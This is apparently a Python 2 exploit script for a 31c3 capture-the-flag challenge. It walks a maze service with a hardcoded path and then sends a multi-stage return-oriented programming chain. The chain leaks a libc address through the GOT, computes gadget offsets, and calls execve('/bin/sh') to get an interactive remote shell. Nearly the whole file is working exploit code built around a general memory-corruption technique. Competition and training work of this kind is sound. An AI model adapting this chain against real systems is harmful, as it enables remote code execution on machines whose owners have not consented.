#!/usr/bin/env python2
import socket
import struct
import sys

"""
maze_data = struct.unpack("H"*8639, file("maze").read()[0x10a0:][:8639*2])
maze_start, maze_target, maze_data = 0x101, maze_data[0], maze_data[1:]
def find_path():
	stack = [(maze_start, 4)]
	visited = set()
	maze_diffs = [-0x100,1,0x100,-1]
	while len(stack):
		maze_pos, i = stack.pop()
		if maze_pos == maze_target:
			return [j for i,j in stack]
		while i != 0:
			i -= 1
			new_pos = maze_pos + maze_diffs[i]
			if new_pos not in maze_data and new_pos not in visited:
				stack.append((maze_pos, i))
				stack.append((new_pos, 4))
				visited.add(new_pos)
				break
#maze_path = find_path()
"""
maze_path = [1, 1, 2, 2, 2, 2, 3, 3, 2, 2, 1, 1, 2, 2, 1, 1, 2, 2, 3, 3, 2, 2, 2, 2, 1, 1, 1, 1, 1, 1, 2, 2, 1, 1, 2, 2, 2, 2, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 1, 1, 2, 2, 2, 2, 2, 2, 3, 3, 2, 2, 2, 2, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 2, 2, 1, 1, 1, 1, 1, 1, 2, 2, 1, 1, 2, 2, 1, 1, 2, 2, 2, 2, 2, 2, 1, 1, 2, 2, 2, 2, 3, 3, 2, 2, 2, 2, 1, 1, 2, 2, 2, 2, 2, 2, 1, 1, 2, 2, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 3, 3, 0, 0, 1, 1, 0, 0, 3, 3, 3, 3, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 1, 1, 1, 1, 2, 2, 1, 1, 2, 2, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 3, 3, 2, 2, 2, 2, 1, 1, 2, 2, 2, 2, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 1, 1, 0, 0, 0, 0, 3, 3, 0, 0, 3, 3, 3, 3, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 3, 3, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 1, 1, 0, 0, 1, 1, 2, 2, 1, 1, 1, 1, 2, 2, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 1, 1, 1, 1, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 1, 2, 2, 2, 2, 2, 2, 1, 1, 2, 2, 1, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 3, 3, 0, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 1, 2, 2, 2, 2, 1, 1, 1, 1, 1, 1, 2, 2, 1, 1, 2, 2, 2, 2, 1, 1, 1, 1, 2, 2, 2, 2, 1, 1, 2, 2, 1, 1, 2, 2, 2, 2, 1, 1, 2, 2, 1, 1, 1, 1, 0, 0, 1, 1, 2, 2, 2, 2, 3, 3, 2, 2, 2, 2, 2, 2, 3, 3, 2, 2, 2, 2, 1, 1, 1, 1, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 2, 3, 3, 2, 2, 3, 3, 3, 3, 3, 3, 2, 2, 3, 3, 2, 2, 1, 1, 1, 1, 2, 2, 1, 1, 2, 2, 1, 1, 0, 0, 1, 1, 2, 2, 2, 2, 1]

s = socket.socket()
#s.connect(("127.0.0.1", 1234))
s.connect(("71.31c3ctf.aachen.ccc.de", 1234))

def read_until(u):
	d = ""
	while not d.endswith(u):
		c = s.recv(4096)
		assert(c)
		d += c
	return d
directions = ["north", "east", "south", "west"]
print read_until("(today)? ")
for step in maze_path:
	s.sendall(directions[step] + "\n")
print read_until("add your name: ")

rop_ret = 0x4007a9
rop_pop_rdi = 0x400f63
rop_pop_rsi_r15 = 0x400f61
rop_pop_r12_to_15 = 0x400f5c
rop_pop_rbx_rbp_r12_to_15 = 0x400f5a
str_percent_s = 0x40132f
str_percent_d = 0x401321
rop_puts = 0x4007f0
rop_vuln_post_rsi = 0x400ce6
rop_vuln_parent = 0x400e96
rop_call_got_with_3args = 0x400f40 #calls *(r12+rbx*8) with r13..r15 as arg, 
rop_pop_rsp = 0x400d9a # pop rsp ; pop r13 ; pop rbp ; ret
got_read = 0x606058
data_addr = 0x6060a0

#first ropchain: call read and write a second ropchain to the got
data = ""
data += struct.pack("Q", rop_call_got_with_3args)
data += struct.pack("Q"*2, rop_pop_rsp, got_read)

init_rbx, init_rbp = 0, 2 #make sure the loop is continued once (we abort after 2. time anyway with a gadget)
init_r12,init_r15,init_r14,init_r13 = got_read, 0, got_read + 8, 1024 #func, args
data = struct.pack("Q"*6, init_rbx, init_r12, init_r13, init_r14, init_r15, init_rbp) + data + chr(0)
data = data.rjust(1031 + 24 + 1, chr(0))
s.sendall(data)
#raw_input()
#if all is fine, we called read(0, got_read + 8, 1024), we have to position a gadget which pops something and rets then


data = ""
data += struct.pack("Q", rop_pop_rdi) #this eats the return address pushed by the call with 3 args helper, it will make sure, the first ropchain pops rsp

#now the second ropchain starts
data += struct.pack("Q", rop_ret) * 32
data += struct.pack("QQ", rop_pop_rdi, got_read)
data += struct.pack("Q", rop_puts)
#this prints the got_read value so we can calculate the libc base

#we need to re-read our ropchain to be able to use libc gadgets, we reuse the positioned pop ret gadget in the got after read
data += struct.pack("Q"*7, rop_pop_rbx_rbp_r12_to_15, 0, 2, got_read, 1024, got_read + 16, 0)
data += struct.pack("Q", rop_call_got_with_3args)

#reset the rsp so we can restart where we started before
data += struct.pack("Q"*2, rop_pop_rsp, got_read)

s.sendall(data)
#we should have called puts with read's address and read again to read a new ropchain
libc_read_addr = struct.unpack("Q", read_until("\n")[:-1].ljust(8, "\x00"))[0]
assert(libc_read_addr)

"""
#for my system:
libc_read_off = 0xec340
#libc_system_off = 0x46530
libc_binsh_off = 0x17d81b
rop_pop_rax = libc_base_addr + 0x193b8
rop_syscall = libc_base_addr + 0xc28d5
rop_pop_rdx = libc_base_addr + 0x1b8e
rop_pop_rsi = libc_base_addr + 0x246f5
"""
#for ubuntu 14.10
libc_read_off = 0xebfb0
libc_binsh_off = 0x17cb1b

libc_base_addr   = libc_read_addr - libc_read_off
libc_binsh_addr  = libc_base_addr + libc_binsh_off

rop_pop_rax = libc_base_addr + 0x1aed0
rop_pop_rdx = libc_base_addr + 0x1b8e
rop_pop_rsi = libc_base_addr + 0x246f5
rop_syscall = libc_base_addr + 0xc2795

print "libc read   is at: %016x" % libc_read_addr
print "libc base   is at: %016x" % libc_base_addr
print "libc binsh  is at: %016x" % libc_binsh_addr

#we have a 3rd ropchain located at got_read + 16

#the ropchain just uses the libc gadgets for execve(/bin/sh) syscall
data = ""
data += struct.pack("QQ", rop_pop_rax, 59)
data += struct.pack("QQ", rop_pop_rsi, 0)
data += struct.pack("QQ", rop_pop_rdx, 0)
data += struct.pack("QQ", rop_pop_rdi, libc_binsh_addr)
data += struct.pack("Q", rop_syscall)
s.sendall(data)

import telnetlib
t = telnetlib.Telnet()
t.sock = s
t.interact()

